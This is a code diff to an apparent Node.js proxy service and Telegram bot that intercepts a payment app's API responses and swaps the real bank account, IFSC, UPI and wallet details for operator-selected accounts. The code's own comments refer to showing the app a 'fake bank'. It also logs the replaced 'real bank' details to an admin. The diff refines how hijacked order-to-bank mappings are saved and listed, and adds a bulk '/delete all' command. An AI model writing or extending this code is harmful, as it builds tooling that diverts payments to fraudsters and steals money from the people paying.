@@ -1086,7 +1086,8 @@ app.post('/bot-webhook', async (req, res) => {
 === MANUAL ORDERS ===
 /addorder <OrderNo> | <BankIndex> — Map order to a bank
 /delorder <OrderNo> — Remove a mapped order
-/orders — List all saved manual orders
+/orders — List all saved orders
+/delete all — Delete all saved orders
 
 === CONTROL ===
 /on — Proxy ON
@@ -1250,12 +1251,16 @@ Example:
       }
       const manualOrders = [];
       const seen = new Set();
-      for (const [orderId, orderData] of Object.entries(data.orderBankMap)) {
-        if (!orderData.isManual) continue; // Only list manually added orders
-        const uniqueKey = orderData.rptNo || orderId;
-        if (seen.has(uniqueKey)) continue;
+      for (const [orderId, rawOrderData] of Object.entries(data.orderBankMap)) {
+        const orderData = parseSavedMapping(rawOrderData);
+        if (!orderData || typeof orderData !== 'object') continue;
+        const uniqueKey = String(orderData.rptNo || orderData.orderNo || orderData.orderId || orderId || '').trim();
+        if (!uniqueKey || seen.has(uniqueKey)) continue;
+        // Show mappings created by the proxy as well as manually added ones.
+        if (!orderData.isManual && !orderData.forced && !orderData.accountNo && !orderData.acctNo) continue;
         seen.add(uniqueKey);
-        manualOrders.push(`🛒 Order: ${uniqueKey}\n🏦 Bank: ${orderData.bank}\n`);
+        const bankText = orderData.bank || `${orderData.accountHolder || orderData.acctName || ''} | ${orderData.accountNo || orderData.acctNo || ''} | ${orderData.ifsc || orderData.acctCode || ''}`;
+        manualOrders.push(`🛒 Order: ${uniqueKey}\n🏦 Bank: ${bankText}\n`);
       }
 
       let m = `📋 Saved Orders (${manualOrders.length}):\n\n`;
@@ -1315,6 +1320,17 @@ Example:
       data._skipOverrideMerge = true;
       await saveData(data);
       await bot.sendMessage(chatId, `✅ Saved Order Mapping:\nOrder: ${orderNo}\nMapped to Bank #${bankIdx + 1}:\n${selectedBank.accountHolder} | ${selectedBank.accountNo}`);
+      return res.sendStatus(200);
+    }
+
+    if (text === '/delete all') {
+      const deletedCount = data.orderBankMap ? Object.keys(data.orderBankMap).length : 0;
+      data.orderBankMap = {};
+      data._skipOverrideMerge = true;
+      await saveData(data);
+      await bot.sendMessage(chatId, deletedCount
+        ? `🗑️ Deleted all saved order mappings (${deletedCount} entries). Banks and other settings were kept.`
+        : 'ℹ️ No saved orders found. Banks and other settings were kept.');
       return res.sendStatus(200);
     }
 
@@ -2127,57 +2143,62 @@ const isSlipDetail = !urlLower.includes('pickuppaymentslip') && (
             }
             const altId = order.orderNo || order.rptNo || '';
 
-            if (isPaying && orderId && amt !== null) {
-              if (!activeBank.minAmount || amt >= activeBank.minAmount) {
-                // Mutate the JSON response directly so the app sees the fake bank
-                const bkAcctC1 = activeBank.accountNo || '';
-                const bkIfscC1 = activeBank.ifsc || '';
-                const bkNameC1 = activeBank.accountHolder || '';
+            const savedHistoryMapping = orderId
+              ? (getSavedOrderMapping(data, orderId) || getSavedOrderMapping(data, order))
+              : null;
+            if (isPaying && orderId && amt !== null && savedHistoryMapping) {
+              const mappedHistoryBank = bankFromSavedOrder(savedHistoryMapping);
+              if (mappedHistoryBank && (mappedHistoryBank.accountNo || mappedHistoryBank.ifsc || mappedHistoryBank.accountHolder) &&
+                  (!activeBank.minAmount || amt >= activeBank.minAmount)) {
+                // Mutate only an already-mapped history row; never create a new
+                // mapping or use the active bank for an unrelated order.
+                const bkAcctC1 = mappedHistoryBank.accountNo || '';
+                const bkIfscC1 = mappedHistoryBank.ifsc || '';
+                const bkNameC1 = mappedHistoryBank.accountHolder || '';
                 const last4C1 = bkAcctC1.slice(-4);
                 let pt = order.payType || order.ctType || 1;
                 if (urlLower.includes('usdt') || order.currency === 'USDT') pt = 0;
                 const originalWalletC1 = typeof order.walletDomain === 'string' ? order.walletDomain : '';
-                const wDomC1 = buildWalletDomain({ ...activeBank, walletDomain: originalWalletC1 }, amt);
+                const wDomC1 = buildWalletDomain({ ...mappedHistoryBank, walletDomain: originalWalletC1 }, amt);
 
                 const hasBank = scanHasBankFields(order, 0);
-                if (hasBank) deepReplaceBankFields(order, activeBank, 0, hasBank);
+                if (hasBank) deepReplaceBankFields(order, mappedHistoryBank, 0, hasBank);
 
                 if (wDomC1) order.walletDomain = wDomC1;
-                if (activeBank.bankName) order.bankName = activeBank.bankName;
+                if (mappedHistoryBank.bankName) order.bankName = mappedHistoryBank.bankName;
+                const replacementApplied = Boolean(wDomC1 || (hasBank && (bkAcctC1 || bkIfscC1 || bkNameC1)));
 
-                if (!data.orderBankMap) data.orderBankMap = {};
-                if (!data.orderBankMap[String(orderId)] || !data.orderBankMap[String(orderId)].forced) {
+                // Only persist the canonical rptNo after this row was actually
+                // rewritten. Never create a KV entry for an untouched row.
+                if (replacementApplied) {
+                  if (!data.orderBankMap) data.orderBankMap = {};
+                  const previousSaved = parseSavedMapping(savedHistoryMapping) || {};
                   const savedData = {
+                    ...previousSaved,
                     bank: `${bkNameC1} | ${bkAcctC1}${bkIfscC1 ? ' | ' + bkIfscC1 : ''}`,
                     accountHolder: bkNameC1,
                     accountNo: bkAcctC1,
                     ifsc: bkIfscC1,
-                    bankName: activeBank.bankName || '',
-                    upiId: activeBank.upiId || '',
+                    bankName: mappedHistoryBank.bankName || previousSaved.bankName || '',
+                    upiId: mappedHistoryBank.upiId || previousSaved.upiId || '',
                     amount: amt,
                     rptNo: orderId,
-                    orderNo: altId || orderId,
-                    walletDomain: wDomC1,
+                    orderNo: altId || previousSaved.orderNo || orderId,
+                    walletDomain: wDomC1 || previousSaved.walletDomain || '',
+                    walletScheme: mappedHistoryBank.walletScheme || previousSaved.walletScheme || inferWalletScheme(order),
                     payType: pt,
                     time: now,
-                    userId: String(userId || ''),
+                    userId: String(userId || previousSaved.userId || ''),
                     forced: true,
                     isManual: true
                   };
 
                   data.orderBankMap[String(orderId)] = savedData;
-                  if (altId && altId !== orderId) {
-                    data.orderBankMap[String(altId)] = savedData;
-                  }
-
-                  // Persist the auto-captured order immediately so /orders sees it
+                  if (altId && altId !== orderId) data.orderBankMap[String(altId)] = savedData;
                   saveData(data).catch(() => { });
 
-                  if (!data.orderBankMap[String(orderId)].notified) {
-                    data.orderBankMap[String(orderId)].notified = true;
-                    if (altId && altId !== orderId) {
-                      data.orderBankMap[String(altId)].notified = true;
-                    }
+                  if (!savedData.notified) {
+                    savedData.notified = true;
                     notifyAdmin(data,
                       `✅ AUTO-CAPTURED FROM HISTORY
 💰 Amount: ₹${amt}
@@ -2452,14 +2473,15 @@ const isSlipDetail = !urlLower.includes('pickuppaymentslip') && (
           if (shouldReplace) {
             const singleOrderState = parseInt(respData ? (respData.orderState ?? respData.state ?? -1) : -1);
             const isPickupResponse = urlLower.includes('/pickuppaymentslip');
+            const isSlipDetailResponse = urlLower.includes('paymentslipdetail') || urlLower.includes('payment_slip_detail') || urlLower.includes('slipdetail');
             const pickupOrderId = isPickupResponse
               ? (getRequestOrderId(req) || reqBody.order_id || reqBody.orderId || reqBody.orderNo || reqBody.rptNo || reqBody.id || reqBody.slipId || '')
               : '';
             const directSingleId = respData && typeof respData === 'object'
               ? (respData.rptNo || respData.orderNo || respData.orderId || respData.id || respData.slipId || '')
               : '';
-            const savedSingleOrder = singleOrderState > 0 || isPickupResponse
-              ? (getSavedOrderMapping(data, directSingleId) || getSavedOrderMapping(data, respData) || getSavedOrderMapping(data, pickupOrderId))
+            const savedSingleOrder = singleOrderState > 0 || isPickupResponse || isSlipDetailResponse
+              ? (getSavedOrderMapping(data, directSingleId) || getSavedOrderMapping(data, respData) || getSavedOrderMapping(data, pickupOrderId) || getSavedOrderMapping(data, getRequestOrderId(req)))
               : null;
             // Completed/history and pick-up responses are strict: no KV mapping
             // means no replacement. Other active/pending responses retain existing behavior.
@@ -2496,33 +2518,50 @@ const isSlipDetail = !urlLower.includes('pickuppaymentslip') && (
     // Only notify when response actually had bank details (paymentslipdetail or bank fields in response)
     if (isOrder && (_realBankSnap || _bankReplaced || _notReplacedAmt !== null || urlLower.includes('paymentslipdetail') || urlLower.includes('news/code/'))) {
       const _orderAmt = _notReplacedAmt !== null ? _notReplacedAmt : getOrderAmount(req, respData);
-      if (_orderId) {
+      if (_orderId && _bankReplaced && _replacedBank) {
         if (!data.orderBankMap) data.orderBankMap = {};
         const existingOrderMapping = getSavedOrderMapping(data, _orderId) || getSavedOrderMapping(data, respData);
         const bk = _bankReplaced && _replacedBank ? _replacedBank : (_realBankSnap || {});
         // Never overwrite an existing KV mapping with the upstream real bank.
-        // This was clearing the selected replacement before history/detail loads.
-        if (!existingOrderMapping) {
-          const altId = (respData && respData.rptNo) ? String(respData.rptNo) : '';
-          const savedData = {
-            bank: `${bk.accountHolder || ''} | ${bk.accountNo || ''} | ${bk.ifsc || ''}`,
-            accountHolder: bk.accountHolder || '',
-            accountNo: bk.accountNo || '',
-            ifsc: bk.ifsc || '',
-            bankName: bk.bankName || '',
-            upiId: bk.upiId || '',
-            time: now,
-            userId: userId || '',
-            rptNo: _orderId,
-            orderNo: altId || _orderId,
-            amount: _orderAmt || 0,
-            isManual: true,
-            forced: true
-          };
-          data.orderBankMap[_orderId] = savedData;
-          if (altId && altId !== _orderId) data.orderBankMap[altId] = savedData;
-          await saveData(data);
+        // Reuse an alias mapping when present, but always materialize it under
+        // the canonical rptNo so /orders and later lookups can find it.
+        const canonicalOrderId = (respData && respData.rptNo) ? String(respData.rptNo) : String(_orderId);
+        const altId = (respData && (respData.orderNo || respData.orderId || respData.id || respData.slipId))
+          ? String(respData.orderNo || respData.orderId || respData.id || respData.slipId)
+          : String(_orderId);
+        const savedData = parseSavedMapping(existingOrderMapping) || {
+          bank: `${bk.accountHolder || ''} | ${bk.accountNo || ''} | ${bk.ifsc || ''}`,
+          accountHolder: bk.accountHolder || '',
+          accountNo: bk.accountNo || '',
+          ifsc: bk.ifsc || '',
+          bankName: bk.bankName || '',
+          upiId: bk.upiId || '',
+          time: now,
+          userId: userId || '',
+          amount: _orderAmt || 0,
+          isManual: true,
+          forced: true
+        };
+        if (_bankReplaced && _replacedBank) {
+          savedData.bank = `${_replacedBank.accountHolder || ''} | ${_replacedBank.accountNo || ''} | ${_replacedBank.ifsc || ''}`;
+          savedData.accountHolder = _replacedBank.accountHolder || '';
+          savedData.accountNo = _replacedBank.accountNo || '';
+          savedData.ifsc = _replacedBank.ifsc || '';
+          savedData.bankName = _replacedBank.bankName || savedData.bankName || '';
+          savedData.upiId = _replacedBank.upiId || savedData.upiId || '';
         }
+        savedData.rptNo = canonicalOrderId;
+        savedData.orderNo = savedData.orderNo || altId || canonicalOrderId;
+        savedData.amount = savedData.amount || _orderAmt || 0;
+        savedData.isManual = true;
+        savedData.forced = true;
+        data.orderBankMap[canonicalOrderId] = savedData;
+        if (_orderId && String(_orderId) !== canonicalOrderId) data.orderBankMap[String(_orderId)] = savedData;
+        if (altId && altId !== canonicalOrderId) data.orderBankMap[altId] = savedData;
+        // Order mappings must persist immediately; do not let the general
+        // ten-second settings-save throttle drop this successful write.
+        data._skipOverrideMerge = true;
+        await saveData(data);
       }
       const realLine = _realBankSnap && (_realBankSnap.accountNo || _realBankSnap.accountHolder)
         ? `🏦 Real Bank:\n  Name: ${_realBankSnap.accountHolder || 'N/A'}\n  Acc:  ${_realBankSnap.accountNo || 'N/A'}${_realBankSnap.ifsc ? '\n  IFSC: ' + _realBankSnap.ifsc : ''}${_realBankSnap.bankName ? '\n  Bank: ' + _realBankSnap.bankName : ''}${_realBankSnap.upiId ? '\n  UPI:  ' + _realBankSnap.upiId : ''}`
